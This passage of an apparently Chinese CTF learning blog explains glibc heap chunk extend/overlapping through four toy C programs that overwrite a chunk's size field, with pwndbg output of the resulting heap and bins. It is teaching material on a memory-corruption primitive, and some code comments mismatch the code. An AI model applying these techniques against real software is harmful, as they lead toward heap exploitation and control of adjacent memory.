class="hljs-number">06</span>:<span class="hljs-number">0030</span>│+<span class="hljs-number">020</span> <span class="hljs-number">0</span>x7fffffffdc00 ◂— <span class="hljs-number">0</span>x1ffffdce0<br><span class="hljs-number">07</span>:<span class="hljs-number">0038</span>│+<span class="hljs-number">028</span> <span class="hljs-number">0</span>x7fffffffdc08 —▸ <span class="hljs-number">0</span>x7fffffffdcf8 —▸ <span class="hljs-number">0</span>x7fffffffdfb5 ◂— <span class="hljs-number">0</span>x657a2f656d6f682f (&#x27;/home/ze&#x27;)<br>──────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────<br> ► <span class="hljs-number">0</span>         <span class="hljs-number">0</span>x40117a main+<span class="hljs-number">36</span><br>   <span class="hljs-number">1</span>   <span class="hljs-number">0</span>x7ffff7c29d90 __libc_start_call_main+<span class="hljs-number">128</span><br>   <span class="hljs-number">2</span>   <span class="hljs-number">0</span>x7ffff7c29e40 __libc_start_main+<span class="hljs-number">128</span><br>   <span class="hljs-number">3</span>         <span class="hljs-number">0</span>x401095 _start+<span class="hljs-number">37</span><br>─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────<br>pwndbg&gt; x/<span class="hljs-number">10</span>gx <span class="hljs-number">0</span>x4042a0<br><span class="hljs-number">0</span>x4042a0:       <span class="hljs-number">0</span>x0000000000000000      <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-number">0</span>x4042b0:       <span class="hljs-number">0</span>x0000000000000000      <span class="hljs-number">0</span>x0000000000000021<br><span class="hljs-number">0</span>x4042c0:       <span class="hljs-number">0</span>x0000000000000000      <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-number">0</span>x4042d0:       <span class="hljs-number">0</span>x0000000000000000      <span class="hljs-number">0</span>x0000000000020d31<br><span class="hljs-number">0</span>x4042e0:       <span class="hljs-number">0</span>x0000000000000000      <span class="hljs-number">0</span>x0000000000000000<br>pwndbg&gt;<br></code></pre></td></tr></table></figure>
+
+<p>当两个 malloc 语句执行之后，堆的内存分布如上；  </p>
+<p>之后，我们把 chunk1 的 size 域更改为 0x41，0x41 是因为 chunk 的 size 域包含了用户控制的大小和 header 的大小。如上所示正好大小为 0x40。在题目中这一步可以由堆溢出得到。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs bash">pwndbg&gt; n<br><br>Breakpoint 4, 0x0000000000401190 <span class="hljs-keyword">in</span> main () at main.c:12<br>12          free(ptr);<br>LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA<br>─────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────────────────<br>*RAX  0x4042a0 ◂— 0<br> RBX  0<br> RCX  0x21<br> RDX  0<br>*RDI  0x4042a0 ◂— 0<br> RSI  0x4042d0 ◂— 0<br> R8   0x21001<br> R9   0x4042c0 ◂— 0<br> R10  0xfffffffffffff000<br> R11  0x7ffff7e1ace0 (main_arena+96) —▸ 0x4042d0 ◂— 0<br> R12  0x7fffffffdcf8 —▸ 0x7fffffffdfb5 ◂— 0x657a2f656d6f682f (<span class="hljs-string">&#x27;/home/ze&#x27;</span>)<br> R13  0x401156 (main) ◂— endbr64<br> R14  0x4030e8 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401120 (__do_global_dtors_aux) ◂— endbr64<br> R15  0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0<br> RBP  0x7fffffffdbe0 ◂— 1<br> RSP  0x7fffffffdbd0 &#123;ptr1&#125; ◂— 0x1000<br>*RIP  0x401190 (main+58) ◂— call free@plt<br>──────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / <span class="hljs-built_in">set</span> <span class="hljs-built_in">emulate</span> on ]───────────────────────────────────────────────────────────────────────────────<br>b+ 0x40117a &lt;main+36&gt;    mov    rax, qword ptr [rbp - 8]     RAX, [&#123;ptr&#125;] =&gt; 0x4042a0 ◂— 0<br>   0x40117e &lt;main+40&gt;    sub    rax, 8                       RAX =&gt; 0x404298 (0x4042a0 - 0x8)<br>   0x401182 &lt;main+44&gt;    mov    qword ptr [rax], 0x41        [0x404298] &lt;= 0x41<br>b+ 0x401189 &lt;main+51&gt;    mov    rax, qword ptr [rbp - 8]     RAX, [&#123;ptr&#125;] =&gt; 0x4042a0 ◂— 0<br>   0x40118d &lt;main+55&gt;    mov    rdi, rax                     RDI =&gt; 0x4042a0 ◂— 0<br> ► 0x401190 &lt;main+58&gt;    call   free@plt                    &lt;free@plt&gt;<br>        ptr: 0x4042a0 ◂— 0<br><br>b+ 0x401195 &lt;main+63&gt;    mov    edi, 0x30                    EDI =&gt; 0x30<br>   0x40119a &lt;main+68&gt;    call   malloc@plt                  &lt;malloc@plt&gt;<br><br>b+ 0x40119f &lt;main+73&gt;    mov    qword ptr [rbp - 0x10], rax<br>   0x4011a3 &lt;main+77&gt;    mov    eax, 0                          EAX =&gt; 0<br>   0x4011a8 &lt;main+82&gt;    leave<br>────────────────────────────────────────────────────────────────────────────────────────[ SOURCE (CODE) ]────────────────────────────────────────────────────────────────────────────────────────<br>In file: /home/zer0ptr/Pwn-Research/Heap-overflow-basic/Chunk_extend_overlapping/对inuse的fastbin进行extend/main.c:12<br>    7     ptr=malloc(0x10);//分配第一个0x10的chunk<br>    8     malloc(0x10);//分配第二个0x10的chunk<br>    9<br>   10     *(long long *)((long long)ptr-<span class="hljs-number">0</span>x8)=<span class="hljs-number">0</span>x41;// 修改第一个块的size域<br>   <span class="hljs-number">11</span><br> ► <span class="hljs-number">12</span>     free(ptr);<br>   <span class="hljs-number">13</span>     ptr1=malloc(<span class="hljs-number">0</span>x30);// 实现 extend，控制了第二个块的内容<br>   <span class="hljs-number">14</span>     return <span class="hljs-number">0</span>;<br>   <span class="hljs-number">15</span> &#125;<br>────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────<br><span class="hljs-number">00</span>:<span class="hljs-number">0000</span>│ rsp <span class="hljs-number">0</span>x7fffffffdbd0 &#123;ptr1&#125; ◂— <span class="hljs-number">0</span>x1000<br><span class="hljs-number">01</span>:<span class="hljs-number">0008</span>│-<span class="hljs-number">008</span> <span class="hljs-number">0</span>x7fffffffdbd8 &#123;ptr&#125; —▸ <span class="hljs-number">0</span>x4042a0 ◂— <span class="hljs-number">0</span><br><span class="hljs-number">02</span>:<span class="hljs-number">0010</span>│ rbp <span class="hljs-number">0</span>x7fffffffdbe0 ◂— <span class="hljs-number">1</span><br><span class="hljs-number">03</span>:<span class="hljs-number">0018</span>│+<span class="hljs-number">008</span> <span class="hljs-number">0</span>x7fffffffdbe8 —▸ <span class="hljs-number">0</span>x7ffff7c29d90 (__libc_start_call_main+<span class="hljs-number">128</span>) ◂— mov edi, eax<br><span class="hljs-number">04</span>:<span class="hljs-number">0020</span>│+<span class="hljs-number">010</span> <span class="hljs-number">0</span>x7fffffffdbf0 ◂— <span class="hljs-number">0</span><br><span class="hljs-number">05</span>:<span class="hljs-number">0028</span>│+<span class="hljs-number">018</span> <span class="hljs-number">0</span>x7fffffffdbf8 —▸ <span class="hljs-number">0</span>x401156 (main) ◂— endbr64<br><span class="hljs-number">06</span>:<span class="hljs-number">0030</span>│+<span class="hljs-number">020</span> <span class="hljs-number">0</span>x7fffffffdc00 ◂— <span class="hljs-number">0</span>x1ffffdce0<br><span class="hljs-number">07</span>:<span class="hljs-number">0038</span>│+<span class="hljs-number">028</span> <span class="hljs-number">0</span>x7fffffffdc08 —▸ <span class="hljs-number">0</span>x7fffffffdcf8 —▸ <span class="hljs-number">0</span>x7fffffffdfb5 ◂— <span class="hljs-number">0</span>x657a2f656d6f682f (&#x27;/home/ze&#x27;)<br>──────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────<br> ► <span class="hljs-number">0</span>         <span class="hljs-number">0</span>x401190 main+<span class="hljs-number">58</span><br>   <span class="hljs-number">1</span>   <span class="hljs-number">0</span>x7ffff7c29d90 __libc_start_call_main+<span class="hljs-number">128</span><br>   <span class="hljs-number">2</span>   <span class="hljs-number">0</span>x7ffff7c29e40 __libc_start_main+<span class="hljs-number">128</span><br>   <span class="hljs-number">3</span>         <span class="hljs-number">0</span>x401095 _start+<span class="hljs-number">37</span><br>pwndbg&gt; x/<span class="hljs-number">4</span>gx <span class="hljs-number">0</span>x404290<br><span class="hljs-number">0</span>x404290:       <span class="hljs-number">0</span>x0000000000000000      <span class="hljs-number">0</span>x0000000000000041<br><span class="hljs-number">0</span>x4042a0:       <span class="hljs-number">0</span>x0000000000000000      <span class="hljs-number">0</span>x0000000000000000<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>这里小回顾一下chunk的结构，就可以解释为什么是看 <code>0x404290</code> 这个地址了(这个地址是chunk的prev_size，而我们修改的就是size域)，下面是一张参考图：</p>
+</blockquote>
+<p><img src="/images/chunk_extend_overlapping/1.png" srcset="/img/loading.gif" lazyload alt="当前chunk结构"></p>
+<p>执行 free 之后，我们可以看到 chunk2 与 chunk1 合成一个 0x40 大小的 chunk，一起释放了：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">pwndbg&gt; bins<br>tcachebins<br>0x40 [  1]: 0x4042a0 ◂— 0<br>fastbins<br>empty<br>unsortedbin<br>empty<br>smallbins<br>empty<br>largebins<br>empty<br></code></pre></td></tr></table></figure>
+
+<p>之后我们通过 malloc(0x30) 得到 chunk1+chunk2 的块，此时就可以直接控制 chunk2 中的内容，我们也把这种状态称为 overlapping chunk。</p>
+<h3 id="基本示例-2：对-inuse-的-smallbin-进行-extend"><a href="#基本示例-2：对-inuse-的-smallbin-进行-extend" class="headerlink" title="基本示例 2：对 inuse 的 smallbin 进行 extend"></a>基本示例 2：对 inuse 的 smallbin 进行 extend</h3><p>通过之前深入理解堆的实现部分的内容，我们得知处于 fastbin 范围的 chunk 释放后会被置入 fastbin 链表中，而不处于这个范围的 chunk 被释放后会被置于 unsorted bin 链表中。 以下这个示例中，我们使用 0x80 这个大小来分配堆（作为对比，fastbin 默认的最大的 chunk 可使用范围是 0x70）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// gcc -g test2.c -o test2</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">void</span> *test, *test1;<br>    test = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>); <span class="hljs-comment">// 分配第一个 0x80 的chunk1</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <span class="hljs-comment">// 分配第二个 0x10 的chunk2s</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <span class="hljs-comment">// 防止与top chunk合并</span><br>    *(<span class="hljs-type">long</span>*)((<span class="hljs-type">long</span>)test<span class="hljs-number">-0x8</span>) = <span class="hljs-number">0xb1</span>;<br>    <span class="hljs-built_in">free</span>(test);<br>    test1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xa0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>在这个例子中，因为分配的 size 不处于 fastbin 的范围，因此在释放时如果与 top chunk 相连会导致和 top chunk 合并。所以我们需要额外分配一个 chunk，把释放的块与 top chunk 隔开。</p>
+<p>我们进gdb中观察一下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">pwndbg&gt; b 9<br>Breakpoint 1 at 0x11a6: file main.c, line 9.<br>pwndbg&gt; r<br>·········<br>────────────────────────────────────────────────────────────────────────────────────────<br>In file: /home/zer0ptr/Pwn-Research/Heap-overflow-basic/Chunk_extend_overlapping/对inuse的smallbin进行extend/main.c:9<br>    4 int <span class="hljs-function"><span class="hljs-title">main</span></span>() &#123;<br>    5     void *<span class="hljs-built_in">test</span>, *test1;<br>    6     <span class="hljs-built_in">test</span> = malloc(0x80); // 分配第一个 0x80 的chunk1<br>    7     malloc(0x10); // 分配第二个 0x10 的chunk2s<br>    8     malloc(0x10); // 防止与top chunk合并<br> ►  9     *(long*)((long)test-<span class="hljs-number">0</span>x8) = <span class="hljs-number">0</span>xb1;<br>   <span class="hljs-number">10</span>     free(test);<br>   <span class="hljs-number">11</span>     test1 = malloc(<span class="hljs-number">0</span>xa0);<br>   <span class="hljs-number">12</span> &#125;<br>·········<br>────────────────────────────────────────────────────────────────────────────────────────────<br>pwndbg&gt; i r rax<br>rax            <span class="hljs-number">0</span>x555555559298      <span class="hljs-number">93824992252568</span><br>pwndbg&gt; x/<span class="hljs-number">30</span>gx <span class="hljs-number">0</span>x555555559298<br><span class="hljs-number">0</span>x555555559298: <span class="hljs-number">0</span>x00000000000000b1      <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-number">0</span>x5555555592a8: <span class="hljs-number">0</span>x0000000000000000      <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-number">0</span>x5555555592b8: <span class="hljs-number">0</span>x0000000000000000      <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-number">0</span>x5555555592c8: <span class="hljs-number">0</span>x0000000000000000      <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-number">0</span>x5555555592d8: <span class="hljs-number">0</span>x0000000000000000      <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-number">0</span>x5555555592e8: <span class="hljs-number">0</span>x0000000000000000      <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-number">0</span>x5555555592f8: <span class="hljs-number">0</span>x0000000000000000      <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-number">0</span>x555555559308: <span class="hljs-number">0</span>x0000000000000000      <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-number">0</span>x555555559318: <span class="hljs-number">0</span>x0000000000000000      <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-number">0</span>x555555559328: <span class="hljs-number">0</span>x0000000000000021      <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-number">0</span>x555555559338: <span class="hljs-number">0</span>x0000000000000000      <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-number">0</span>x555555559348: <span class="hljs-number">0</span>x0000000000000021      <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-number">0</span>x555555559358: <span class="hljs-number">0</span>x0000000000000000      <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-number">0</span>x555555559368: <span class="hljs-number">0</span>x0000000000020ca1      <span class="hljs-number">0</span>x0000000000000000<br><span class="hljs-number">0</span>x555555559378: <span class="hljs-number">0</span>x0000000000000000      <span class="hljs-number">0</span>x0000000000000000<br></code></pre></td></tr></table></figure>
+
+<p>其中，chunk1如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">0x555555559298: 0x00000000000000b1      0x0000000000000000<br>0x5555555592a8: 0x0000000000000000      0x0000000000000000<br>0x5555555592b8: 0x0000000000000000      0x0000000000000000<br>0x5555555592c8: 0x0000000000000000      0x0000000000000000<br>0x5555555592d8: 0x0000000000000000      0x0000000000000000<br>0x5555555592e8: 0x0000000000000000      0x0000000000000000<br>0x5555555592f8: 0x0000000000000000      0x0000000000000000<br>0x555555559308: 0x0000000000000000      0x0000000000000000<br>0x555555559318: 0x0000000000000000      0x0000000000000000<br></code></pre></td></tr></table></figure>
+
+<p>chunk2：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">0x555555559328: 0x0000000000000021      0x0000000000000000<br>0x555555559338: 0x0000000000000000      0x0000000000000000<br></code></pre></td></tr></table></figure>
+
+<p>用于隔离 top_chunk 的chunk(那它下面那个就是top chunk啦！)：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">0x555555559328: 0x0000000000000021      0x0000000000000000<br>0x555555559338: 0x0000000000000000      0x0000000000000000<br></code></pre></td></tr></table></figure>
+
+<p>接下来在第10行处下断点，执行<code>*(int *)((int)test-0x8) = 0xb1;</code>这段代码：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs bash">pwndbg&gt; x/30gx 0x555555559298<br>0x555555559298: 0x00000000000000b1      0x0000000555555559<br>0x5555555592a8: 0xe1643fe79a375a5e      0x0000000000000000<br>0x5555555592b8: 0x0000000000000000      0x0000000000000000<br>0x5555555592c8: 0x0000000000000000      0x0000000000000000<br>0x5555555592d8: 0x0000000000000000      0x0000000000000000<br>0x5555555592e8: 0x0000000000000000      0x0000000000000000<br>0x5555555592f8: 0x0000000000000000      0x0000000000000000<br>0x555555559308: 0x0000000000000000      0x0000000000000000<br>0x555555559318: 0x0000000000000000      0x0000000000000000<br>0x555555559328: 0x0000000000000021      0x0000000000000000<br>0x555555559338: 0x0000000000000000      0x0000000000000000<br>0x555555559348: 0x0000000000000021      0x0000000000000000<br>0x555555559358: 0x0000000000000000      0x0000000000000000<br>0x555555559368: 0x0000000000020ca1      0x0000000000000000<br>0x555555559378: 0x0000000000000000      0x0000000000000000<br>pwndbg&gt; bin<br>Ambiguous <span class="hljs-built_in">command</span> <span class="hljs-string">&quot;bin&quot;</span>: binder, bins.<br>pwndbg&gt; bins<br>tcachebins<br>0xb0 [  1]: 0x5555555592a0 ◂— 0<br>fastbins<br>empty<br>unsortedbin<br>empty<br>smallbins<br>empty<br>largebins<br>empty<br>pwndbg&gt;<br>tcachebins<br>0xb0 [  1]: 0x5555555592a0 ◂— 0<br>fastbins<br>empty<br>unsortedbin<br>empty<br>smallbins<br>empty<br>largebins<br>empty<br>pwndbg&gt;<br></code></pre></td></tr></table></figure>
+
+<p>没有得到预期的结果，根据 <code>tcachebins</code> 猜测是因为使用了新版本的glibc导致，但我们仍然可以根据参考文章中学习其思路；</p>
+<p><img src="/images/chunk_extend_overlapping/2.png" srcset="/img/loading.gif" lazyload alt="执行`*(int *)((int)test-0x8) = 0xb1;`后chunk结构"></p>
+<p>和前面的例子一样，<code>*(int *)((int)test-0x8) = 0xb1;</code>这段代码也是将chunk1的size部分进行了更改，将原有的0x90扩展到了0xb0。这就导致了chunk2被chunk1所包含。接下来我们在第11行下断点释放chunk1：</p>
+<p><img src="/images/chunk_extend_overlapping/3.png" srcset="/img/loading.gif" lazyload alt="chunk1释放后chunk结构和bins"></p>
+<p>这里解释一下为什么进的是unsortbin，有两种情况下进unsortbin：</p>
+<ul>
+<li>当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中</li>
+<li>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中</li>
+</ul>
+<p>那么这个例子就满足第二种情况，不属于fastbin中的空闲块，并且不和top chunk相邻。其实这个例子和第一个例子差不多，因为chunk1和chunk2合并之后的chunk的大小超过了fast bin的最大接收值，所以不进fast bin，并且chunk3的size标志位变成了0，证明前一个块chunk2是一个释放的状态。接下来的过程也是一样的，再次申请一个0xa0大小的chunk时，会从unsort bin中提取。连带着chunk2中的内容也会被提取出来，这样一来再次对chunk1进行操作，从而达到操作chunk2的目的。</p>
+<h3 id="基本示例-3：对-free-的-smallbin-进行-extend"><a href="#基本示例-3：对-free-的-smallbin-进行-extend" class="headerlink" title="基本示例 3：对 free 的 smallbin 进行 extend"></a>基本示例 3：对 free 的 smallbin 进行 extend</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//gcc -g test3 -o test3</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">void</span> *test, *test1;<br>    test = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<span class="hljs-comment">//分配第一个0x80的chunk1</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<span class="hljs-comment">//分配第二个0x10的chunk2</span><br>    <span class="hljs-built_in">free</span>(test);<span class="hljs-comment">//首先进行释放，使得chunk1进入unsorted bin</span><br>    *(<span class="hljs-type">long</span> *)((<span class="hljs-type">long</span>)test - <span class="hljs-number">0x8</span>) = <span class="hljs-number">0xb1</span>;<br>    test1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xa0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>第三个例子和前面两个有一些区别，前面两个都是先修改chunk1的size大小然后进行释放，但是这个例子是先进行释放，然后重新修改chunk1的size大小，依然还是一步一步来，首先在第8行下断点，使程序完成申请chunk的操作：</p>
+<p><img src="/images/chunk_extend_overlapping/4.png" srcset="/img/loading.gif" lazyload alt="程序完成申请chunk操作后chunk结构"></p>
+<p>接下来我们在第9行下断点，使程序完成对chunk1的释放：</p>
+<p><img src="/images/chunk_extend_overlapping/5.png" srcset="/img/loading.gif" lazyload alt="程序完成释放chunk1操作后chunk结构"></p>
+<p>没有什么意外，释放之后的chunk1依然进入了unsort bin中。接下来 我们将断点下载第10行，需要注意的是此时更改size大小的操作是在free之后完成的：</p>
+<p><img src="/images/chunk_extend_overlapping/6.png" srcset="/img/loading.gif" lazyload alt="经过free后更改size操作的chunk结构"></p>
+<p>此时再进行 malloc 分配就可以得到 chunk1+chunk2 的堆块，从而控制了 chunk2 的内容。</p>
+<blockquote>
+<p>在修改完size之后重新申请0xa0的时候会从unsort bin中申请，这个时候大家需要总结一下，其实各个bin中存放的只有chunk的首地址，真正判断多大还得是去看这个chunk的size大小，所以再次申请的时候依然还可以对chunk2进行控制</p>
+</blockquote>
+<h3 id="基本示例-4：通过-extend-后向-overlapping"><a href="#基本示例-4：通过-extend-后向-overlapping" class="headerlink" title="基本示例 4：通过 extend 后向 overlapping"></a>基本示例 4：通过 extend 后向 overlapping</h3><p>这里展示通过 extend 进行后向 overlapping，这也是在 CTF 中最常出现的情况，通过 overlapping 可以实现其它的一些利用。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">void</span> *ptr,*ptr1;<br><br>    ptr=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<span class="hljs-comment">//分配第1个 0x80 的chunk1</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <span class="hljs-comment">//分配第2个 0x10 的chunk2</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <span class="hljs-comment">//分配第3个 0x10 的chunk3</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>); <span class="hljs-comment">//分配第4个 0x10 的chunk4    </span><br>    *(<span class="hljs-type">int</span> *)((<span class="hljs-type">int</span>)ptr<span class="hljs-number">-0x8</span>)=<span class="hljs-number">0x61</span>;<br>    <span class="hljs-built_in">free</span>(ptr);<br>    ptr1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x50</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>初始化分配 4 个堆之后：</p>
+<p><img src="/images/chunk_extend_overlapping/7.png" srcset="/img/loading.gif" lazyload></p>
+<p>将第一个 chunk size 修改为 0x61 ，然后 free 第一个堆块，红框内的都会被当做一个整体放入到 fastbin 当中：</p>
+<p><img src="/images/chunk_extend_overlapping/8.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/images/chunk_extend_overlapping/9.png" srcset="/img/loading.gif" lazyload></p>
+<p>那么当再次分配大小为 0x50 （不含chunk header）时，就会调用这块内存了：</p>
+<p><img src="/images/chunk_extend_overlapping/10.png" srcset="/img/loading.gif" lazyload></p>
+<p>在 malloc(0x50) 对 extend 区域重新占位后，其中 0x10 的 fastbin 块依然可以正常的分配和释放，此时已经构成 overlapping，通过对 overlapping 的进行操作可以实现 fastbin attack。</p>
